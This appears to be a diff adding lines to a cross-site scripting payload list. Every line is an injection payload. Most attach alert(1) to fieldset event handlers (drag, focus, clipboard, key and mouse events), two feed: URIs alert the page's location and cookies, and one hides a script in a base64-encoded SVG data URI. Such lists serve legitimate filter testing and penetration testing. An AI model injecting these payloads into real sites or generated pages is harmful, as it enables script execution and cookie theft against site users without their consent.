@@ -1,0 +1,35 @@
+feed:data:text/html,&#x3c;script>alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie)&#x3c;/script>&#x3c;b>
+feed:javascript:alert('Top Page Location: '+document.location+' Host Page Cookies: '+document.cookie);//<br/><hr/>
+<feImage><set attributeName="xlink:href" to="data:image/svg+xml;charset=utf-8;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ%2BYWxlcnQoMSk8L3NjcmlwdD48L3N2Zz4NCg%3D%3D"/></feImage>
+<fieldset draggable="true" ondrag="alert(1)">test</fieldset>
+<fieldset draggable="true" ondragend="alert(1)">test</fieldset>
+<fieldset draggable="true" ondragenter="alert(1)">test</fieldset>
+<fieldset draggable="true" ondragleave="alert(1)">test</fieldset>
+<fieldset draggable="true" ondragstart="alert(1)">test</fieldset>
+<fieldset id=x tabindex=1 onactivate=alert(1)></fieldset>
+<fieldset id=x tabindex=1 onbeforeactivate=alert(1)></fieldset>
+<fieldset id=x tabindex=1 onbeforedeactivate=alert(1)></fieldset><input autofocus>
+<fieldset id=x tabindex=1 ondeactivate=alert(1)></fieldset><input id=y autofocus>
+<fieldset id=x tabindex=1 onfocus=alert(1)></fieldset>
+<fieldset id=x tabindex=1 onfocusin=alert(1)></fieldset>
+<fieldset onbeforecopy="alert(1)" contenteditable>test</fieldset>
+<fieldset onbeforecut="alert(1)" contenteditable>test</fieldset>
+<fieldset onbeforepaste="alert(1)" contenteditable>test</fieldset>
+<fieldset onblur=alert(1) tabindex=1 id=x></fieldset><input autofocus>
+<fieldset onclick="alert(1)">test</fieldset>
+<fieldset oncontextmenu="alert(1)">test</fieldset>
+<fieldset oncopy="alert(1)" contenteditable>test</fieldset>
+<fieldset oncut="alert(1)" contenteditable>test</fieldset>
+<fieldset ondblclick="alert(1)">test</fieldset>
+<fieldset onfocusout=alert(1) tabindex=1 id=x></fieldset><input autofocus>
+<fieldset onkeydown="alert(1)" contenteditable>test</fieldset>
+<fieldset onkeypress="alert(1)" contenteditable>test</fieldset>
+<fieldset onkeyup="alert(1)" contenteditable>test</fieldset>
+<fieldset onmousedown="alert(1)">test</fieldset>
+<fieldset onmouseenter="alert(1)">test</fieldset>
+<fieldset onmouseleave="alert(1)">test</fieldset>
+<fieldset onmousemove="alert(1)">test</fieldset>
+<fieldset onmouseout="alert(1)">test</fieldset>
+<fieldset onmouseover="alert(1)">test</fieldset>
+<fieldset onmouseup="alert(1)">test</fieldset>
+<fieldset onpaste="alert(1)" contenteditable>test</fieldset>
